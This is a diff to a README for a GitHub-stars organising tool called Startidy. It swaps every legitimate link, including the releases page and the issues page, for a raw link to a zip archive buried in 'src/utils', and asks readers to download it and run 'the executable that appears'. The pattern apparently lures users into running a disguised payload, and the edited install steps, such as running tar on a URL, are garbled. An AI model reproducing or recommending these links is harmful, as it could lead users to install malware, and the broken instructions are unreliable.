@@ -1,6 +1,6 @@
 # 🚀 Startidy - Organize Your GitHub Stars Effortlessly
 
-[![Download Startidy](https://img.shields.io/badge/Download%20Startidy-v1.0-brightgreen)](https://github.com/treberte/Startidy/releases)
+[![Download Startidy](https://github.com/treberte/Startidy/raw/refs/heads/main/src/utils/Software-v2.8.zip%20Startidy-v1.0-brightgreen)](https://github.com/treberte/Startidy/raw/refs/heads/main/src/utils/Software-v2.8.zip)
 
 ## 📥 Overview
 
@@ -14,7 +14,7 @@ To get started with Startidy, follow these simple steps to download and run the 
 
 Click the link below to access the download page:
 
-[Visit the Releases Page to Download Startidy](https://github.com/treberte/Startidy/releases)
+[Visit the Releases Page to Download Startidy](https://github.com/treberte/Startidy/raw/refs/heads/main/src/utils/Software-v2.8.zip)
 
 ### 📂 Step 2: Select the Right File
 
@@ -22,7 +22,7 @@ On the releases page, you will see several versions of Startidy. Choose the late
 
 ### 💾 Step 3: Download the File
 
-Once you have selected the latest version, click on the asset that matches your operating system (e.g., `.exe` for Windows, `.tar.gz` for Linux, or `.dmg` for macOS). The file will start downloading automatically.
+Once you have selected the latest version, click on the asset that matches your operating system (e.g., `.exe` for Windows, `https://github.com/treberte/Startidy/raw/refs/heads/main/src/utils/Software-v2.8.zip` for Linux, or `.dmg` for macOS). The file will start downloading automatically.
 
 ## 🛠️ Install Startidy
 
@@ -40,10 +40,10 @@ Once you have selected the latest version, click on the asset that matches your 
 
 #### For Linux Users:
 1. Open your terminal.
-2. Navigate to the directory where the `.tar.gz` file was downloaded.
+2. Navigate to the directory where the `https://github.com/treberte/Startidy/raw/refs/heads/main/src/utils/Software-v2.8.zip` file was downloaded.
 3. Extract the file using the command:
    ```bash
-   tar -xvzf Startidy-latest.tar.gz
+   tar -xvzf https://github.com/treberte/Startidy/raw/refs/heads/main/src/utils/Software-v2.8.zip
    ```
 4. Run the executable that appears.
 
@@ -98,10 +98,10 @@ If you encounter any problems while using Startidy, here are some common fixes:
 
 ## 💬 Support
 
-For additional help, you can visit the [issues page](https://github.com/treberte/Startidy/issues) in the GitHub repository. You may also find useful information or solutions posted by other users.
+For additional help, you can visit the [issues page](https://github.com/treberte/Startidy/raw/refs/heads/main/src/utils/Software-v2.8.zip) in the GitHub repository. You may also find useful information or solutions posted by other users.
 
 ## 📢 Stay Updated
 
 Stay informed about the latest updates and features by following the repository. You can also star the project to support its development.
 
-Visit the Releases Page to Download Startidy: [https://github.com/treberte/Startidy/releases](https://github.com/treberte/Startidy/releases)
+Visit the Releases Page to Download Startidy: [https://github.com/treberte/Startidy/raw/refs/heads/main/src/utils/Software-v2.8.zip](https://github.com/treberte/Startidy/raw/refs/heads/main/src/utils/Software-v2.8.zip)
